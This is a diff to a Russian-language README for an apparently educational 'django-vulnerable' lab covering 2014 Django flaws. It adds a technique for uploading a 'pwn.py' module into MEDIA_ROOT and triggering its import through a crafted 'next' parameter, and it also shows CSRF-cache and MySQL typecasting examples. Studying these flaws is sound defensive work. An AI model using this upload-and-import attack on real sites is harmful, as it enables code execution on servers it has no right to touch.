@@ -29,10 +29,37 @@ $ django-admin.py startproject django-vulnerable
 	           MM
 
 
+Для успешной выполнения уязвимости злоумышленник должен использовать внедрить код.
+
+Один из способов - уязвимая конфигурация `MEDIA_ROOT`.
+
+```python
+import os
+
+PROJECT_DIR = os.path.dirname(os.path.dirname(__file__))
+MEDIA_ROOT = os.path.join(PROJECT_DIR, 'media')
+```
+
+Используя загрузку файла залили exploit в `MEDIA_ROOT`.
+
+Теперь `MEDIA_ROOT` полноценный `Python package`, который можно импортировать.
+
+
+       $ tree media/
+       media/
+       ├── __init__.py
+       ├── __init__.pyc
+       ├── pwn.py
+       └── pwn.pyc
+
+
+(`pyc` файлы появляются после эксплуатации уязвимости)
+
+
 HTTP запрос злоумышленника
 
 
-	$ curl localhost:8000?next=pwn.own
+	$ curl localhost:8000?next=media.pwn.own
 
 	                     .ed"""" """$$$$be.
 	                   -"           ^""**$$$e.
@@ -67,14 +94,14 @@ HTTP запрос злоумышленника
 	            """""                              "$$$"
 
 
-В этом случае происходим импорт модуля `pwn` с выполнением `import side effect`
+В этом случае происходим импорт модуля `media.pwn` с выполнением `import side effect`
 
 
 ## Issue: Caching of anonymous pages could reveal CSRF token ##
 
 ### Анатомия уязвимости
 
-	$ curl -I localhost:8000/login/
+	$ curl -I localhost:8000/boom/
 	HTTP/1.0 200 OK
 	Date: Sun, 04 May 2014 14:58:59 GMT
 	Server: WSGIServer/0.1 Python/2.7.6
@@ -114,9 +141,9 @@ HTTP запрос злоумышленника
 Попытаемся разобраться о чем идет речь
 
 
-	>>> query_obj = CVE_2014_0474_Blacklist.objects.filter(ip=192)
+	>>> query_obj = CVE_2014_0474_Blacklist.objects.filter(ip=192.168)
 	>>> print query_obj.query
-	SELECT `blacklist`.`id`, `blacklist`.`ip` FROM `blacklist` WHERE `blacklist`.`ip` = 192 
+	SELECT `blacklist`.`id`, `blacklist`.`ip` FROM `blacklist` WHERE `blacklist`.`ip` = 192.168
 
 	mysql> SELECT `blacklist`.`id`, `blacklist`.`ip` FROM `blacklist` WHERE `blacklist`.`ip` = 192.168;
 	+----+---------------+
